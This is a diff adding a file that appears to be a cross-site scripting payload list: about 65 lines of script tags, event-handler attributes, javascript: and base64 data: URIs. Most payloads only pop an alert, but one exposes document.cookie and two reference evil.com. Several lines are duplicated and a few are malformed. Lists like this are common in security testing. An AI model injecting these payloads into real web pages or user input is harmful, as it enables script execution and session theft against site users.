@@ -1,0 +1,66 @@
+
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<a href="javascript:alert(1)">Click me</a>
+<button onclick="alert(1)">Click</button>
+<body onload=alert(1)>
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+<a href="javascript:alert('XSS')">Click here</a>
+<body onload="alert('XSS')">
+<input type="text" value="<script>alert('XSS')</script>">
+<button onclick="alert('XSS')">Click me</button>
+<div onmouseover="alert('XSS')">Hover over me</div>
+<textarea onfocus="alert('XSS')"></textarea>
+<svg onload="alert('XSS')"></svg>
+<iframe src="javascript:alert('XSS')"></iframe>
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert('XSS')">Click me</a>
+<body onload="alert('XSS')">
+<input type="text" value="<script>alert('XSS')</script>">
+<button onclick="alert('XSS')">Click me</button>
+<div onmouseover="alert('XSS')">Hover me</div>
+<textarea onfocus="alert('XSS')"></textarea>
+<img src="x" onerror="this.src='https://evil.com/xss.png'">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+<script src="javascript:alert('XSS')"></script>
+<form action="javascript:alert('XSS')">Submit</form>
+<a href="http://evil.com/?<script>alert('XSS')</script>">Link</a>
+<script>alert(document.cookie)</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<object data="javascript:alert('XSS')"></object>
+<embed src="javascript:alert('XSS')">
+<b onmouseover="alert('XSS')">Text</b>
+<script>confirm('XSS')</script>
+<a href="javascript:void(0);" onclick="alert('XSS')">Link</a>
+<body oncontextmenu="alert('XSS')">Right click me</body>
+<audio autoplay="autoplay" onerror="alert('XSS')"></audio>
+<input type="button" value="Click" onclick="alert('XSS')">
+<p onmouseup="alert('XSS')">Click here</p>
+<marquee behavior="scroll" onstart="alert('XSS')">Scrolling Text</marquee>
+<script>eval("alert('XSS')")</script>
+<div style="width:1px;height:1px;" onmouseover="alert('XSS')">Invisible</div>
+<object data="javascript:alert('XSS')"></object>
+<input type="text" value="<img src=x onerror=alert('XSS')>">
+<h1 onmouseover="alert('XSS')">Hover here</h1>
+<b onmouseover="alert('XSS')">Text</b>
+<script>alert(location)</script>
+<input type="text" onfocus="alert('XSS')">
+<style>@import 'javascript:alert('XSS')';</style>
+<meta http-equiv="refresh" content="0; url=javascript:alert('XSS')">
+<textarea onblur="alert('XSS')"></textarea>
+<div contenteditable="true" oninput="alert('XSS')">Text</div>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>
+<svg><script>alert('XSS')</script></svg>
+<img src="invalid" onerror="alert('XSS')">
+<a href="javascript:eval('alert(\'XSS\')')">Click here</a>
+<iframe src="javascript:eval('alert(\'XSS\')')"></iframe>
+<meta http-equiv="refresh" content="0; url=javascript:eval('alert(\'XSS\')')">
+<input type="button" value="Submit" onclick="location.href='javascript:alert(\'XSS\')'">
+<script src="data:text/javascript;base64,YWxlcnQoJ1hTUyc3MScp"></script>
+<script>window.location='javascript:alert(\'XSS\')'</script>
+<script>window.open('javascript:alert(\'XSS\')')</script>
+<form action="javascript:alert('XSS')"><input type="submit"></form>
